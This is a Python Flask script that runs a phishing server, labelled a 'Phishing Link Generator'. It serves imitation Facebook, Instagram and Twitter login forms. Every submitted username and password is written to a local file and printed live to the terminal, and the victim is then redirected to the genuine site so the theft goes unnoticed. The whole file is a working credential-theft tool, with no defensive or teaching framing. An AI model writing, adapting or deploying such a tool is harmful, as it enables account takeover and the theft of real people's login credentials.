import os
import subprocess
import sys
from flask import Flask, request, redirect

# Auto-install Flask if not present
try:
    from flask import Flask
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
    from flask import Flask

app = Flask(__name__)

DATA_FILE = 'captured_data.txt'

# HTML Templates for fake pages
templates = {
    "facebook": """
        <html><head><title>Facebook Login</title></head><body>
        <h2>Facebook Login</h2>
        <form method="POST">
            Email or Phone: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Log In">
        </form>
        </body></html>
    """,
    "instagram": """
        <html><head><title>Instagram Login</title></head><body>
        <h2>Instagram Login</h2>
        <form method="POST">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Log In">
        </form>
        </body></html>
    """,
    "twitter": """
        <html><head><title>Twitter Login</title></head><body>
        <h2>Twitter Login</h2>
        <form method="POST">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Log In">
        </form>
        </body></html>
    """
}

def save_and_print(platform, username, password):
    data_line = f"{platform} - Username: {username} | Password: {password}\n"
    
    # Save to file
    with open(DATA_FILE, 'a') as f:
        f.write(data_line)
    
    # Print live to terminal
    print("[+] Captured Login:")
    print(data_line)

@app.route('/')
def home():
    return """
    <h2>Phishing Link Generator - Localhost</h2>
    <ul>
        <li><a href="/facebook">Facebook Login Page</a></li>
        <li><a href="/instagram">Instagram Login Page</a></li>
        <li><a href="/twitter">Twitter Login Page</a></li>
    </ul>
    """

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_and_print('Facebook', username, password)
        return redirect('https://www.facebook.com')
    return templates['facebook']

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_and_print('Instagram', username, password)
        return redirect('https://www.instagram.com')
    return templates['instagram']

@app.route('/twitter', methods=['GET', 'POST'])
def twitter():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_and_print('Twitter', username, password)
        return redirect('https://twitter.com/login')
    return templates['twitter']

if __name__ == '__main__':
    if not os.path.exists(DATA_FILE):
        open(DATA_FILE, 'w').close()
    print("[+] Phishing server running at http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000)